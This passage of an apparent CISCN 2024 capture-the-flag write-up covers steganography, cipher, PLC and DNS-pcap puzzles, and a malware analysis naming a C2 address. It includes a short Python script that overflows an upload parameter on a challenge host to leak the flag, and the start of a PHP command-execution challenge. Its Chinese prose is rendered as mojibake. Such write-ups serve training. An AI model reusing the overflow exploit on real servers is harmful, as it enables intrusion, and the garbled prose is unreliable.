&#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27;</span><br><span class="hljs-string"> &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27;</span><br><span class="hljs-string"> &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27;</span><br><span class="hljs-string"> &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27;</span><br><span class="hljs-string"> &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27;</span><br><span class="hljs-string"> &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27;</span><br><span class="hljs-string"> &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27;</span><br><span class="hljs-string"> &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27;</span><br><span class="hljs-string"> &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27;</span><br><span class="hljs-string"> &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27;</span><br><span class="hljs-string"> &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27;</span><br><span class="hljs-string"> &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27;</span><br><span class="hljs-string"> &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27;</span><br><span class="hljs-string"> &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27;</span><br><span class="hljs-string"> &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27;</span><br><span class="hljs-string"> &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27;</span><br><span class="hljs-string"> &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27;]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<p>å¯¹æ¯”åå¾—åˆ°ç™»å½•å¯†ç <code>_ciscn_2024_</code></p>
<h2 id="ç«é”…é“¾è§‚å…‰æ‰“å¡"><a href="#ç«é”…é“¾è§‚å…‰æ‰“å¡" class="headerlink" title="ç«é”…é“¾è§‚å…‰æ‰“å¡"></a>ç«é”…é“¾è§‚å…‰æ‰“å¡</h2><p>è¿æ¥MetaMaskåå¼€å§‹æ¸¸æˆ</p>
<p><img src="/img/wp/2024/%E7%81%AB%E9%94%85%E9%93%BE%E8%A7%82%E5%85%89%E6%89%93%E5%8D%A1-1.png"></p>
<p><img src="/img/wp/2024/%E7%81%AB%E9%94%85%E9%93%BE%E8%A7%82%E5%85%89%E6%89%93%E5%8D%A1-2.png"></p>
<h2 id="ç¥ç§˜æ–‡ä»¶"><a href="#ç¥ç§˜æ–‡ä»¶" class="headerlink" title="ç¥ç§˜æ–‡ä»¶"></a>ç¥ç§˜æ–‡ä»¶</h2><p>PPTç¬¬ä¸‰é¡µ</p>
<p><code>UGF5dDQ6NmYtNDA=</code>è§£base64å¾—åˆ°<code>Payt4:6f-40</code></p>
<p><img src="/img/wp/2024/%E7%A5%9E%E7%A7%98%E6%96%87%E4%BB%B6-1.png"></p>
<p>PPTç¬¬äº”é¡µ</p>
<p>å¤‡æ³¨ä¸­çš„å­—ç¬¦ä¸²å¾ªç¯è§£å¯†base64å¾—åˆ°<code>pArt5:5f-90d</code></p>
<p>å·¦ä¸Šè§’çš„<code>UGFyVDY6ZC0y</code>base64è§£å¯†å¾—åˆ°<code>ParT6:d-2</code></p>
<p><img src="/img/wp/2024/%E7%A5%9E%E7%A7%98%E6%96%87%E4%BB%B6-2.png"></p>
<p>åœ¨<code>ppt\slides\slide4.xml</code>ä¸­æ‰¾åˆ°ç¬¬ä¸ƒéƒ¨åˆ†</p>
<p>ROT13ç„¶åbase64 <code>PART7=22b3</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p:cNvPr</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;4&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;HRSFIQp9ZwWvZj==&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:cNvPr</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;5&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ROT13(All)&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure>


<p>åœ¨<code>ppt\slideLayouts\slideLayout2.xml</code>æˆ–è€…å¹»ç¯ç‰‡æ¯ç‰ˆä¸­å¯ä»¥çœ‹åˆ°ç¬¬å…«éƒ¨åˆ†</p>
<p>å»é™¤B,b,1,3åbase64  <code>paRt8:87e</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a:t</span>&gt;</span>c1GFSbd3Dg6BODbdl<span class="hljs-tag">&lt;/<span class="hljs-name">a:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a:t</span>&gt;</span>Remove All <span class="hljs-tag">&lt;/<span class="hljs-name">a:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a:t</span>&gt;</span>â€™B â€™/â€™bâ€™ /â€™1 â€™/â€™3â€™<span class="hljs-tag">&lt;/<span class="hljs-name">a:t</span>&gt;</span><br></code></pre></td></tr></table></figure>


<p>åœ¨<code>ppt\media\image57.jpg</code>åº•éƒ¨å­˜åœ¨å¯†æ–‡ï¼Œbase64è§£å¯†å¾—åˆ°<code>parT9:dee</code></p>
<p><img src="/img/wp/2024/%E7%A5%9E%E7%A7%98%E6%96%87%E4%BB%B6-3.png"></p>
<p>åœ¨<code>ppt\comments\comment1.xml</code>ä¸­å¾—åˆ°ç¬¬åéƒ¨åˆ†</p>
<p>ç»´å‰å°¼äºšåbase64 <code>PARt10:9&#125;</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>ZYWJbIYnFhq9<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>What is thisï¼Ÿ<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>Vigenere cipher is goodï¼<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>Ahaï¼Œthe key is<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>Is whatï¼Ÿ<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>furry<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>ğŸ†—<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>åœ¨<code>docProps\app.xml</code>å¾—åˆ°åŠ å¯†æ–¹å¼ï¼Œ<code>docProps\core.xml</code>å¾—åˆ°å¯†æ–‡å’Œå¯†é’¥</p>
<p>Bifidè§£å¯†åbase64 <code>Part1:flag&#123;e</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Manager</span>&gt;</span>Bifid cipher<span class="hljs-tag">&lt;/<span class="hljs-name">Manager</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dc:title</span>&gt;</span>è¿™æ˜¯ä¸€ä¸ªæ ‡é¢˜ QFCfpPQ6ZymuM3gq<span class="hljs-tag">&lt;/<span class="hljs-name">dc:title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dc:creator</span>&gt;</span>Administrator;Key:lanjing<span class="hljs-tag">&lt;/<span class="hljs-name">dc:creator</span>&gt;</span><br></code></pre></td></tr></table></figure>



<p>å°†<code>ppt\embeddings\Microsoft_Word_Document.docx</code>æ”¹æˆzipè§£å‹</p>
<p><code>word\document.xml</code>å¾—åˆ°ç¬¬äºŒéƒ¨åˆ†</p>
<p>å‡¯æ’’åç§»10åbase64 <code>part2:675efb</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">w:t</span>&gt;</span>è¿™<span class="hljs-tag">&lt;/<span class="hljs-name">w:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">w:t</span>&gt;</span>o<span class="hljs-tag">&lt;/<span class="hljs-name">w:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">w:t</span>&gt;</span>ffset:10<span class="hljs-tag">&lt;/<span class="hljs-name">w:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">w:t</span>&gt;</span>é‡Œ<span class="hljs-tag">&lt;/<span class="hljs-name">w:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">w:t</span>&gt;</span>åŸæ¥ä¼¼ä¹æœ‰ä»€ä¹ˆï¼Œåæ¥å¥½åƒè¢«å°C<span class="hljs-tag">&lt;/<span class="hljs-name">w:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">w:t</span>&gt;</span>aesar<span class="hljs-tag">&lt;/<span class="hljs-name">w:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">w:t</span>&gt;</span>æŠ±èµ°äº†ï¼<span class="hljs-tag">&lt;/<span class="hljs-name">w:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">w:t</span>&gt;</span>mQPinNS6Xtm1JGJs<span class="hljs-tag">&lt;/<span class="hljs-name">w:t</span>&gt;</span><br></code></pre></td></tr></table></figure>


<p>åœ¨PPTä¸­æ‰“å¼€å®ç¼–è¾‘å™¨</p>
<figure class="highlight vb"><table><tr><td class="code"><pre><code class="hljs vb"><span class="hljs-keyword">Sub</span> crypto(sMessage, strKey)<br>    <span class="hljs-keyword">Dim</span> kLen, x, y, i, j, temp<br>    <span class="hljs-keyword">Dim</span> s(<span class="hljs-number">256</span>), k(<span class="hljs-number">256</span>)<br><br>    kLen = Len(strKey)<br>    <span class="hljs-keyword">For</span> i = <span class="hljs-number">0</span> <span class="hljs-keyword">To</span> <span class="hljs-number">255</span><br>        s(i) = i<br>        k(i) = Asc(<span class="hljs-keyword">Mid</span>(strKey, (i <span class="hljs-built_in">Mod</span> kLen) + <span class="hljs-number">1</span>, <span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">Next</span><br><br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">For</span> i = <span class="hljs-number">0</span> <span class="hljs-keyword">To</span> <span class="hljs-number">255</span><br>        j = (j + k(i) + s(i)) <span class="hljs-built_in">Mod</span> <span class="hljs-number">256</span><br>        temp = s(i)<br>        s(i) = s(j)<br>        s(j) = temp<br>    <span class="hljs-keyword">Next</span><br><br>    x = <span class="hljs-number">0</span><br>    y = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">For</span> i = <span class="hljs-number">1</span> <span class="hljs-keyword">To</span> <span class="hljs-number">3072</span><br>        x = (x + <span class="hljs-number">1</span>) <span class="hljs-built_in">Mod</span> <span class="hljs-number">256</span><br>        y = (y + s(x)) <span class="hljs-built_in">Mod</span> <span class="hljs-number">256</span><br>        temp = s(x)<br>        s(x) = s(y)<br>        s(y) = temp<br>    <span class="hljs-keyword">Next</span><br><br>    <span class="hljs-keyword">For</span> i = <span class="hljs-number">1</span> <span class="hljs-keyword">To</span> Len(sMessage)<br>        x = (x + <span class="hljs-number">1</span>) <span class="hljs-built_in">Mod</span> <span class="hljs-number">256</span><br>        y = (y + s(x)) <span class="hljs-built_in">Mod</span> <span class="hljs-number">256</span><br>        temp = s(x)<br>        s(x) = s(y)<br>        s(y) = temp<br><br>        crypto = crypto &amp; (s((s(x) + s(y)) <span class="hljs-built_in">Mod</span> <span class="hljs-number">256</span>) <span class="hljs-built_in">Xor</span> Asc(<span class="hljs-keyword">Mid</span>(sMessage, i, <span class="hljs-number">1</span>))) &amp; <span class="hljs-string">&quot;,&quot;</span><br>    <span class="hljs-keyword">Next</span><br>    <span class="hljs-comment">&#x27;i13POMdzEAzHfy4dGS+vUA==(After base64)</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br></code></pre></td></tr></table></figure>

<p>rc4åbase64å¾—åˆ°<code>PArt3:3-34</code></p>
<p>å°†ä¸€åˆ°åéƒ¨åˆ†æ‹¼æ¥åœ¨ä¸€èµ·ï¼š<code>flag&#123;e675efb3-346f-405f-90dd-222b387edee9&#125;</code></p>
<h2 id="é€šé£æœº"><a href="#é€šé£æœº" class="headerlink" title="é€šé£æœº"></a>é€šé£æœº</h2><p>ä¿®è¡¥æ–‡ä»¶å¤´ï¼ŒåŠ ä¸Š<code>GJK</code>åç”¨<code>STEP 7 Micro/WIN</code>æ‰“å¼€</p>
<p>ç¬¦å·è¡¨é‡Œæ³¨é‡Šçš„å­—ç¬¦ä¸²base64å¾—åˆ°flag</p>
<p><img src="/img/wp/2024/%E9%80%9A%E9%A3%8E%E6%9C%BA-1.png"></p>
<h2 id="ç›—ç‰ˆè½¯ä»¶"><a href="#ç›—ç‰ˆè½¯ä»¶" class="headerlink" title="ç›—ç‰ˆè½¯ä»¶"></a>ç›—ç‰ˆè½¯ä»¶</h2><p>è¿è¡Œhackexe.exeä¼šç”Ÿæˆ<code>loader.exe</code>å’Œ<code>output.png</code></p>
<p>stegsolveå‘ç°å›¾ç‰‡åœ¨çº¢è‰²é€šé“æ¯éš”ä¸€ä½ç»„åˆèµ·æ¥æ˜¯zipï¼Œå†™è„šæœ¬æå–å‡ºæ¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.png&#x27;</span>)<br>b=<span class="hljs-built_in">list</span>(a.getdata())<br>e=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(b),<span class="hljs-number">2</span>):<br>    e.append(b[i][<span class="hljs-number">0</span>])<br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>(e))<br>f.close()<br></code></pre></td></tr></table></figure>

<p>è§£å‹åå¾—åˆ°<code>.b</code>æ–‡ä»¶</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">r()J$nEA&#x27;r!!#;^5u:HM1&quot;&#x27;W(Mc*q[&lt;_/-H(eBQ_+@m$P8kMf4a[h&gt;1:e3=VX?9p=!\&gt;H[_9!-P!Q!d_;F+/NMc([U69Id&gt;ct7iR(^gBUKlR.n!/lA`!!!!iKtqeC8-.(6Mb&quot;[QMa/CV!RTk-8H6e+1!)_&gt;1l+[&#x27;ejqO2X?j\E%7($238erL9ERs6#Xpc$FkBeaMa/OZ!RPFEM[W-EMa/7R!RO,j&quot;Gf?G6!.Ga!ROtQ6!-EU6!?g3ll\Sls57!F=^&quot;@S&#x27;&#x27;W&#x27;hs8Q@r^3=WR?SaG;!&#x27;sXWM&lt;7?[m%=@Z!(i%/8\&gt;*)+T!Ns8F&amp;Q@8VuM%M=EmC9Qqfgs4&#x27;f&quot;l=^2!!!$.f\g`/F!&lt;:Sa$:.up:e`[d9ejFSs1h0^_FX^B8;Y/K]&#x27;9g`i;_=uM8s?B6!-g;i^eq%6+WJ\FCG4&quot;Ktqd;8cR(Yjlhm.!!#QBlju^Ei_;/LC&#x27;6h)8;[..\cUR+?iSZ/p],bC8;&quot;i&#x27;?A\Aj5XAOd!&quot;],16!-[7njkLW6+U0o;s&quot;&amp;08;Y5UM8r=Fa[q?Y8;Z%kM&gt;9HK!nkY%s4)bs!.?7t6!%3&amp;!&#x27;gMa6!.k%&gt;!]_-0+Tc:eQ5m&gt;\ohmb@K4kLs3Bjks8W*i!Q.GW`^kgWFgOI7k?)I!=hET4.LJIugAf\<br></code></pre></td></tr></table></figure>

<p>å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œbase85åä¸¢åˆ°æ²™ç®±ä¸­</p>
<p>å¾—åˆ°c2åœ°å€<code>39.100.72.235</code></p>
<p><img src="/img/wp/2024/%E7%9B%97%E7%89%88%E8%BD%AF%E4%BB%B6-1.png"></p>
<p>ç„¶ååˆ†æ<code>3842.dmp</code></p>
<p>ä½¿ç”¨stringsæœç´¢æ‰€æœ‰httpæˆ–è€…ftpå¼€å¤´çš„é“¾æ¥</p>
<p><code>strings 3842.dmp | grep -iE &quot;^(http|ftp|chrome|firefox).*\.(txt|xml|png|jpg|gif|zip|rar|7z|pdf|doc|docx|php|py|flag|exe)$&quot; &gt; 1.txt</code></p>
<p>ç„¶åå»é™¤ baidu.com xunfei.com è¿™ç§å®˜æ–¹ç½‘ç«™</p>
<p>æ ¹æ®é¢˜ç›®æè¿°<code>åœ¨ç½‘ä¸Šä¸‹äº†ä¸€ä¸ªç›—ç‰ˆè½¯ä»¶</code> å¾ˆæ˜æ˜¾æ˜¯<code>winhack.com</code>äº†</p>
<p><img src="/img/wp/2024/%E7%9B%97%E7%89%88%E8%BD%AF%E4%BB%B6-2.png"></p>
<p>æ‹¼æ¥åmd5</p>
<p><code>winhack.com39.100.72.235</code></p>
<p><code>flag&#123;096e8b0f9daf10869f013c1b7efda3fd&#125;</code></p>
<h2 id="p-amp-p"><a href="#p-amp-p" class="headerlink" title="p&amp;p"></a>p&amp;p</h2><p>åˆ©ç”¨æº¢å‡ºä¿®æ”¹flagå†™å…¥æ–‡ä»¶ä½ç½®ï¼Œç„¶åè®¿é—®&#x2F;static&#x2F;1å³å¯è·å¾—flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib.parse <span class="hljs-keyword">as</span> parse<br><br>url=<span class="hljs-string">&quot;http://8.147.131.163:39352/upload?name=&quot;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">112</span>+<span class="hljs-number">16</span>+<span class="hljs-number">6</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x1e</span>+<span class="hljs-string">&#x27;static/1&#x27;</span><br><span class="hljs-built_in">print</span>(url)<br>r=requests.get(url)<br>url=<span class="hljs-string">&quot;http://8.147.131.163:39352/test&quot;</span><br>r=requests.get(url)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>

<h2 id="Tough-DNS"><a href="#Tough-DNS" class="headerlink" title="Tough_DNS"></a>Tough_DNS</h2><blockquote>
<p>é¢˜ç›®å†…å®¹ï¼šDNSçš„ä¸–ç•Œå……æ»¡äº†å¤šå˜çš„å­—ç¬¦ï¼Œæ¥ä¸‹æ¥æˆ‘å°†ç›´æ¥ç»™ä½ ç­”æ¡ˆï¼š56 16 26 93 66 53 16 56 d2 03 26 93 56</p>
</blockquote>
<p>ä¸€æ‰“å¼€å°±æ˜¯å¤§é‡è¯·æ±‚ä¸€ä¸²10çš„æ•°æ®</p>
<p><img src="/img/wp/2024/Tough_DNS-1.png"></p>
<p>æå–å‡ºæ¥ï¼Œå¼€å¤´7ä¸ª1ï¼Œä¸€çœ¼äºŒç»´ç </p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">111111101100101111111<br>100000100100101000001<br>101110101010101011101<br>101110101001001011101<br>101110101110001011101<br>100000100000001000001<br>111111101010101111111<br>000000000110000000000<br>111100101010010011101<br>010010000010110111111<br>011001111000101100001<br>001110000110100001000<br>000101111001001100000<br>000000001111001110010<br>111111100100011010110<br>100000100011010000100<br>101110100001000010110<br>101110101110110100110<br>101110101011110101100<br>100000101110001111001<br>111111101111001111100<br></code></pre></td></tr></table></figure>


<p>æ‰«ç å¾—åˆ°<code>15f9792dba5c</code></p>
<p><img src="/img/wp/2024/Tough_DNS-2.png"></p>
<p>ç„¶åç”¨tsharkæå–è¯·æ±‚çš„txtå­—æ®µ</p>
<p><code>tshark -r Tough_DNS.pcapng -T json -e dns.txt -Y &quot;dns.txt&quot; &gt; 1.txt</code></p>
<p>åˆ†æå‘ç°æ¯éš”ä¸€ä½åˆšå¥½ç»„æˆ<code>504B</code>ï¼Œpythonæå–è½¬æ–‡ä»¶</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>)<br><br>d=f.read()<br>d=json.loads(d)<br><br>e1=<span class="hljs-string">&#x27;&#x27;</span><br>e2=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(d),<span class="hljs-number">2</span>):<br>    e1+=d[i][<span class="hljs-string">&#x27;_source&#x27;</span>][<span class="hljs-string">&#x27;layers&#x27;</span>][<span class="hljs-string">&#x27;dns.txt&#x27;</span>][<span class="hljs-number">0</span>]<br>    e2+=d[i+<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;_source&#x27;</span>][<span class="hljs-string">&#x27;layers&#x27;</span>][<span class="hljs-string">&#x27;dns.txt&#x27;</span>][<span class="hljs-number">0</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(e1))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(e2))<br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.bin&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>.fromhex(e1[<span class="hljs-number">1</span>:]))<br>f.close()<br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.bin&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>.fromhex(e2[<span class="hljs-number">1</span>:]))<br>f.close()<br></code></pre></td></tr></table></figure>

<p>æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œå‹ç¼©åŒ…å’ŒPGPæ–‡ä»¶</p>
<p><img src="/img/wp/2024/Tough_DNS-3.png"></p>
<p>è§£å‹å¯†ç æ˜¯äºŒç»´ç çš„ç»“æœï¼Œè§£å‹å¾—åˆ°<code>secret.gpg</code></p>
<p>ç”¨PGPToolå¯¼å…¥secret.gpg</p>
<p><img src="/img/wp/2024/Tough_DNS-4.png"></p>
<p>ç„¶åè§£å¯†æå–å‡ºæ¥çš„æ–‡ä»¶ï¼Œå¯†ç åœ¨é¢˜ç›®æè¿°ä¸­</p>
<p>æ ¹æ®asciiç èŒƒå›´ï¼Œå‰é¢åº”è¯¥æ˜¯2-7ï¼Œè°ƒæ•´ä½ç½®<code>65 61 62 39 66 35 61 65 2d 30 62 39 65</code>ï¼Œå¾—åˆ°<code>eab9f5ae-0b9e</code></p>
<p><img src="/img/wp/2024/Tough_DNS-5.png"></p>
<p>å¾—åˆ°<code>flag&#123;79830a47-faf7-4067-b585-145776f833cd&#125;</code></p>
<p><img src="/img/wp/2024/Tough_DNS-6.png"></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Simple-php"><a href="#Simple-php" class="headerlink" title="Simple_php"></a>Simple_php</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html/&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>     <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ 